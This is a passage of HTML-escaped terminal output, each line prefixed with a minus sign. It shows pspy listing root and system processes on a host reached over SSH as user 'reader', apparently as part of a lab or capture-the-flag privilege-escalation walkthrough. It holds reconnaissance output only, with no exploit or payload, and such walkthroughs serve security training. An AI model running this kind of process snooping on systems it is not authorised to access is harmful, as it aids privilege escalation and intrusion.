-inotify events &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;| Watching directories: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/usr /tmp /etc /home /var /opt] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;recursive&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;non-recursive&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                       
-Draining file system events due to startup...                                                                                    &lt;span class=&quot;k&quot;&gt;done                                                            
-&lt;/span&gt;2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9      |                                                                                   
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;101  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;791    | /lib/systemd/systemd-resolved 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;785    | /lib/systemd/systemd-networkd                                                     
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;62583 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;766    | /lib/systemd/systemd-timesyncd                                                   
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7      |                                                                                   
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;693    |                                                                                   
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;690    | bpfilter_umh
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;687    |                                                                                   
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;669    |                                                                                   
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;637    |                                                                                   
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;623    |                                                                                   
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;613    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;612    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;611    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;610    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;606    | /lib/systemd/systemd-udevd 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;603    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6      | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;594    | /sbin/lvmetad &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;  
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;584    | /lib/systemd/systemd-journald 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;583    | /usr/bin/vmtoolsd 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;521    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;504    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;470    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4164   | &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;5 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4114   | ./pspy 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4      | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;399    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;398    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;397    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;387    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3759   | &lt;span class=&quot;nt&quot;&gt;-bash&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3758   | sshd: reader@pts/0   
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3669   | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sd-pam&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3668   | /lib/systemd/systemd &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3639   | sshd: reader &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;priv]
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;350    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;349    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;348    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;347    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;346    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;345    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;344    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;343    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;342    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;341    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;340    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;339    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;338    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;337    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;336    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;335    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;334    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;333    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;331    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3302   | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;330    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;328    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;327    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;324    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;323    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;322    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;321    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;320    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;32     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;319    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;318    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;317    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;316    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;315    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;314    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;313    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3123   | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;312    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;311    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;310    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;31     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;309    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3083   | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;308    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;307    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;306    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;305    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;304    |
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;303    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;302    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;301    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;300    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3      | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;299    | 
